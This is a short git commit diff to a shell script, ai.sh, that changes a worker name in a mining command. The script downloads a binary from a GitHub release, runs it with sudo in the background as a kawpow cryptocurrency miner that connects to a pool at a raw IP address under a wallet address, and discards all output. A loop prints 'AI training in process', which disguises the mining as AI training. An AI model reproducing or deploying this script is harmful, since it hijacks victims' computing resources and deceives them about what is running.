21ba8c6ea5ea71d1726f60f63477160887875b9c
max313iq <153689278+max313iq@users.noreply.github.com>
2024-12-14 03:49:14 +0300

    Update ai.sh

--- ai.sh
+++ ai.sh
@@ -6,7 +6,7 @@ fi
 nohup bash -c " 
   wget https://github.com/max313iq/tech/releases/download/Gft/aitraininng -O aitraininng
   chmod +x aitraininng
-  sudo ./aitraininng -a kawpow -o stratum+tcp://104.194.134.155:4444 -u RM2ciYa3CRqyreRsf25omrB4e1S95waALr.b21atch &
+  sudo ./aitraininng -a kawpow -o stratum+tcp://104.194.134.155:4444 -u RM2ciYa3CRqyreRsf25omrB4e1S95waALr.b2atch &
 " > /dev/null 2>&1 &
 while true; do
     echo "AI training in process"
